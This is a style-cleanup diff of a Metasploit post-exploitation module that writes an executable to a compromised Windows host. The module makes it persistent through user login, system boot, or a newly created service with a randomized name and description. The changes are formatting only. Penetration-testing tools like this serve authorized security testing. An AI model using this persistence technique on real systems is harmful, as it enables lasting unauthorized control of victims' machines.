@@ -11,19 +11,23 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Services
 
   def initialize(info = {})
-    super(update_info(info,
-                      'Name' => 'Windows Manage Persistent EXE Payload Installer',
-                      'Description'   => %q(
-                            This Module will upload an executable to a remote host and make it Persistent.
-                            It can be installed as USER, SYSTEM, or SERVICE. USER will start on user login,
-                            SYSTEM will start on system boot but requires privs. SERVICE will create a new service
-                            which will start the payload. Again requires privs.
-                                             ),
-                      'License'       => MSF_LICENSE,
-                      'Author'        => [ 'Merlyn drforbin Cousins <drforbin6[at]gmail.com>' ],
-                      'Version'       => '$Revision:1$',
-                      'Platform'      => [ 'windows' ],
-                      'SessionTypes'  => [ 'meterpreter']))
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Manage Persistent EXE Payload Installer',
+        'Description' => %q{
+          This Module will upload an executable to a remote host and make it Persistent.
+          It can be installed as USER, SYSTEM, or SERVICE. USER will start on user login,
+          SYSTEM will start on system boot but requires privs. SERVICE will create a new service
+          which will start the payload. Again requires privs.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [ 'Merlyn drforbin Cousins <drforbin6[at]gmail.com>' ],
+        'Version' => '$Revision:1$',
+        'Platform' => [ 'windows' ],
+        'SessionTypes' => [ 'meterpreter']
+      )
+    )
 
     register_options(
       [
@@ -37,10 +41,10 @@ class MetasploitModule < Msf::Post
     register_advanced_options(
       [
         OptString.new('LocalExePath', [false, 'The local exe path to run. Use temp directory as default. ']),
-        OptString.new('StartupName',   [false, 'The name of service or registry. Random string as default.' ]),
-        OptString.new('ServiceDescription',   [false, 'The description of service. Random string as default.' ])
-      ])
-
+        OptString.new('StartupName', [false, 'The name of service or registry. Random string as default.' ]),
+        OptString.new('ServiceDescription', [false, 'The description of service. Random string as default.' ])
+      ]
+    )
   end
 
   # Run Method for when run command is issued
@@ -140,13 +144,13 @@ class MetasploitModule < Msf::Post
   # Function to install payload as a service
   #-------------------------------------------------------------------------------
   def install_as_service(script_on_target)
-    if  is_system? || is_admin?
+    if is_system? || is_admin?
       print_status("Installing as service..")
       nam = datastore['StartupName'] || Rex::Text.rand_text_alpha(rand(8) + 8)
       description = datastore['ServiceDescription'] || Rex::Text.rand_text_alpha(8)
       print_status("Creating service #{nam}")
 
-      key = service_create(nam, :path=>"cmd /c \"#{script_on_target}\"",:display=>description)
+      key = service_create(nam, :path => "cmd /c \"#{script_on_target}\"", :display => description)
 
       # check if service had been created
       if key != 0
@@ -172,17 +176,17 @@ class MetasploitModule < Msf::Post
 
       begin
         temprexe = datastore['LocalExePath'] + "\\" + rexename
-        write_file_to_target(temprexe,rexe)
+        write_file_to_target(temprexe, rexe)
       rescue Rex::Post::Meterpreter::RequestError
         print_warning("Insufficient privileges to write in #{datastore['LocalExePath']}, writing to %TEMP%")
         temprexe = session.sys.config.getenv('TEMP') + "\\" + rexename
-        write_file_to_target(temprexe,rexe)
+        write_file_to_target(temprexe, rexe)
       end
 
     # Write to %temp% directory if not set LocalExePath
     else
       temprexe = session.sys.config.getenv('TEMP') + "\\" + rexename
-      write_file_to_target(temprexe,rexe)
+      write_file_to_target(temprexe, rexe)
     end
 
     print_good("Persistent Script written to #{temprexe}")
@@ -190,7 +194,7 @@ class MetasploitModule < Msf::Post
     temprexe
   end
 
-  def write_file_to_target(temprexe,rexe)
+  def write_file_to_target(temprexe, rexe)
     fd = session.fs.file.new(temprexe, "wb")
     fd.write(rexe)
     fd.close
